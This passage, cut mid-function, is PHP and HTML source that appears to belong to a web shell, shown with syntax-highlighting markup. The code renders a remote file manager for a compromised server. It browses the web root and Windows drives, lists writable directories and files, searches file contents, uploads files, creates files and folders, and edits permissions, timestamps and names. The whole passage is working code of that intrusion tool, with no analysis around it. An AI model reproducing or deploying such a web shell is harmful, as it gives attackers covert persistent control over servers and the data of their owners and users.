<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $('inputnav').style.display = "";
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $('pathnav').style.display = "none";
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   //hidenav();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> return</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span>(src.id =="inputnav") {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> return</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   src = src.parentNode;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #b5bd68;">}while</span>(src.parentNode)

<span style="color: #969896; background-color: #1d1f21;"> </span>   $('inputnav').style.display = "none";
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('pathnav').style.display = "";
}
&lt;/script&gt;
&lt;div style="background:#eee;margin-bottom:10px;"&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0"&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;tr&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;td width="100%"&gt;&lt;?php echo $cwd_links.' - '.getChmod($nowpath).' / <span style="text-decoration: underline;">'.getPerms($nowpath).getUser($nowpath);?&gt; (&lt;?php echo $dir_writeable;?&gt;)&lt;/td&gt;</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;td nowrap&gt;&lt;input class="bt" id="jumpto" name="jumpto" value="Jump t<span style="text-decoration: underline;">o" type="button"&gt;&lt;/td&gt;</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;/tr&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;/table&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0"<span style="text-decoration: underline;"> style="display:none;"&gt;</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;form action="" method="post" id="godir" name="godir"&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;tr&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;td nowrap&gt;Current Directory (&lt;?php echo $dir_writeable;?&gt;, &lt;?php ec<span style="text-decoration: underline;">ho getChmod($nowpath);?&gt;)&lt;/td&gt;</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;td width="100%"&gt;&lt;input name="view_writable" value="0" type="hidden"<span style="text-decoration: underline;"> /&gt;&lt;input class="input" name="dir" value="&lt;?php echo $nowpath;?&gt;" type="text" style="width:99%;margin:0 8px;"&gt;&lt;/td&gt;</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;td nowrap&gt;&lt;input class="bt" value="GO" type="submit"&gt;&lt;/td&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;/tr&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;/form&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;/table&gt;
&lt;?php
<span style="color: #969896; background-color: #1d1f21;"> </span>   if (IS_WIN &amp;&amp; IS_COM) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $obj = new COM('scripting.filesystemobject');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($obj &amp;&amp; is_object($obj) &amp;&amp; $obj-&gt;Drives) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   echo '&lt;div class="drives"&gt;';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $DriveTypeDB = array(0 =&gt; 'Unknow',1 =&gt; 'Removable',2 =&gt; 'Fixed',3 =<span style="text-decoration: underline;">&gt; 'Network',4 =&gt; 'CDRom',5 =&gt; 'RAM Disk');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $comma = '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach($obj-&gt;Drives as $drive) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($drive-&gt;Path) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p($comma.'&lt;a href="javascript:godir(\''.$drive-&gt;Path.'/\');"<span style="text-decoration: underline;">&gt;'.$DriveTypeDB[$drive-&gt;DriveType].'('.$drive-&gt;Path.')&lt;/a&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $comma = '&lt;span&gt;|&lt;/span&gt;';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   echo '&lt;/div&gt;';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
?&gt;
&lt;/div&gt;
&lt;?php
<span style="color: #969896; background-color: #1d1f21;"> </span>   $findstr = $_POST['findstr'];
<span style="color: #969896; background-color: #1d1f21;"> </span>   $re = $_POST['re'];
<span style="color: #969896; background-color: #1d1f21;"> </span>   tbhead();
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="alt1"&gt;&lt;td colspan="7" style="padding:5px;line-height:20px;"&gt;')<span style="text-decoration: underline;">;</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;form action="'.$self.'" method="POST" enctype="multipart/form-data"&gt;&lt;div<span style="text-decoration: underline;"> style="float:right;"&gt;&lt;input class="input" name="uploadfile" value="" type="file" /&gt; &lt;input class="bt" name="doupfile" value="Upload" type="submit" /&gt;&lt;input name="uploaddir" value="'.$nowpath.'" type="hidden" /&gt;&lt;input name="dir" value="'.$nowpath.'" type="hidden" /&gt;&lt;/div&gt;&lt;/form&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');"&gt;WebRoot&lt;/a<span style="text-decoration: underline;">&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   p(' | &lt;a href="javascript:godir(\'.\');"&gt;ScriptPath&lt;/a&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p(' | &lt;a href="javascript:godir(\''.$nowpath.'\');"&gt;View All&lt;/a&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p(' | View Writable ( &lt;a href="javascript:godir(\''.$nowpath.'\',\'dir\');"&gt;<span style="text-decoration: underline;">Directory&lt;/a&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   p(' | &lt;a href="javascript:godir(\''.$nowpath.'\',\'file\');"&gt;File&lt;/a&gt; )');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p(' | &lt;a href="javascript:createdir();"&gt;Create Directory&lt;/a&gt; | &lt;a href="java<span style="text-decoration: underline;">script:createfile(\''.$nowpath.'\');"&gt;Create File&lt;/a&gt;');</span>

<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;div style="padding:5px 0;"&gt;&lt;form action="'.$self.'" method="POST"&gt;Find s<span style="text-decoration: underline;">tring in files(current folder): &lt;input class="input" name="findstr" value="'.$findstr.'" type="text" /&gt; &lt;input class="bt" value="Find" type="submit" /&gt; Type: &lt;input class="input" name="writabledb" value="'.$writabledb.'" type="text" /&gt;&lt;input name="dir" value="'.$dir.'" type="hidden" /&gt; &lt;input name="re" value="1" type="checkbox" '.($re ? 'checked' : '').' /&gt; Regular expressions&lt;/form&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;');</span>

<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last mod<span style="text-decoration: underline;">ified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;');</span>

<span style="color: #969896; background-color: #1d1f21;"> </span>   //&#26597;&#30475;&#25152;&#26377;&#21487;&#20889;&#25991;&#20214;&#21644;&#30446;&#24405;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdata=array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata=array();

<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($view_writable == 'dir') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdata = GetWDirList($nowpath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata = array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   } elseif ($view_writable == 'file') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdata = array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata = GetWFileList($nowpath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   } elseif ($findstr) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdata = array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata = GetSFileList($nowpath, $findstr, $re);
<span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   // &#30446;&#24405;&#21015;&#34920;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   //scandir()&#25928;&#29575;&#26356;&#39640;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirs=@opendir($dir);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   while ($file=@readdir($dirs)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filepath=$nowpath.$file;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if(@is_dir($filepath)){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdb['filename']=$file;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdb['dirchmod']=getChmod($filepath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdb['dirperm']=getPerms($filepath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdb['fileowner']=getUser($filepath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdb['dirlink']=$nowpath;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdb['server_link']=$filepath;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdata[]=$dirdb;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {<span style="color: #de935f; background-color: #373b41;">        </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedb['filename']=$file;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedb['size']=sizecount(@filesize($filepath));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedb['filechmod']=getChmod($filepath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedb['fileperm']=getPerms($filepath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedb['fileowner']=getUser($filepath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedb['dirlink']=$nowpath;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedb['server_link']=$filepath;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata[]=$filedb;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }// while
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   unset($dirdb);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   unset($filedb);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @closedir($dirs);
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   @sort($dirdata);
<span style="color: #969896; background-color: #1d1f21;"> </span>   @sort($filedata);
<span style="color: #969896; background-color: #1d1f21;"> </span>   $dir_i = '0';

<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;form id="filelist" name="filelist" action="'.$self.'" method="post"&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','file');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('thefile');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('doing');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('dir',$nowpath);

<span style="color: #969896; background-color: #1d1f21;"> </span>   foreach($dirdata as $key =&gt; $dirdb){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if($dirdb['filename']!='..' &amp;&amp; $dirdb['filename']!='.') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if($getdir &amp;&amp; $getdir == $dirdb['server_link']) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $attachsize = dirsize($dirdb['server_link']);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $attachsize = is_numeric($attachsize) ? sizecount($attachsize) :<span style="text-decoration: underline;"> 'Unknown';</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $attachsize = '&lt;a href="javascript:getsize(\''.$dirdb['server_li<span style="text-decoration: underline;">nk'].'\',\''.$dir.'\');"&gt;Stat&lt;/a&gt;';</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $thisbg = bg();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" o<span style="text-decoration: underline;">nmouseout="this.className=\''.$thisbg.'\';"&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'<span style="text-decoration: underline;">.$dirdb['server_link'].'"&gt;&lt;/td&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;&lt;a href="javascript:godir(\''.$dirdb['server_link'].'\');"&gt;'.<span style="text-decoration: underline;">$dirdb['filename'].'&lt;/a&gt;&lt;/td&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''.$dirdb['ser<span style="text-decoration: underline;">ver_link'].'\',\''.$dirdb['dirlink'].'\');"&gt;'.$dirdb['mtime'].'&lt;/a&gt;&lt;/td&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td nowrap&gt;'.$attachsize.'&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td nowrap&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;a href="javascript:fileperm(\''.$dirdb['server_link'].'\');"&gt;'.$<span style="text-decoration: underline;">dirdb['dirchmod'].'&lt;/a&gt; / ');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;a href="javascript:fileperm(\''.$dirdb['server_link'].'\');"&gt;'.$<span style="text-decoration: underline;">dirdb['dirperm'].'&lt;/a&gt;'.$dirdb['fileowner'].'&lt;/td&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td nowrap&gt;&lt;a href="javascript:rename(\''.$dirdb['server_link'].'<span style="text-decoration: underline;">\');"&gt;Rename&lt;/a&gt;&lt;/td&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/tr&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dir_i++;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if($dirdb['filename']=='..') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class='.bg().'&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td align="center"&gt;-&lt;/td&gt;&lt;td nowrap colspan="5"&gt;&lt;a href="java<span style="text-decoration: underline;">script:godir(\''.getUpPath($nowpath).'\');"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/tr&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }

<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px <span style="text-decoration: underline;">solid #ddd;"&gt;&lt;td colspan="6" height="5"&gt;&lt;/td&gt;&lt;/tr&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   $file_i = '0';

<span style="color: #969896; background-color: #1d1f21;"> </span>   foreach($filedata as $key =&gt; $filedb){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if($filedb['filename']!='..' &amp;&amp; $filedb['filename']!='.') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $fileurl = str_replace($_SERVER["DOCUMENT_ROOT"],'',$filedb['server_<span style="text-decoration: underline;">link']);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $thisbg = bg();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" o<span style="text-decoration: underline;">nmouseout="this.className=\''.$thisbg.'\';"&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'<span style="text-decoration: underline;">.$filedb['server_link'].'"&gt;&lt;/td&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.((strpos($filedb['server_link'], $_SERVER["DOCUMENT_ROOT"])<span style="text-decoration: underline;"> !== false) ? '&lt;a href="'.$fileurl.'" target="_blank"&gt;'.$filedb['filename'].'&lt;/a&gt;' : $filedb['filename']).'&lt;/td&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''.$filedb['se<span style="text-decoration: underline;">rver_link'].'\',\''.$filedb['dirlink'].'\');"&gt;'.$filedb['mtime'].'&lt;/a&gt;&lt;/td&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td nowrap&gt;'.$filedb['size'].'&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td nowrap&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;a href="javascript:fileperm(\''.$filedb['server_link'].'\');"&gt;'.<span style="text-decoration: underline;">$filedb['filechmod'].'&lt;/a&gt; / ');</span>
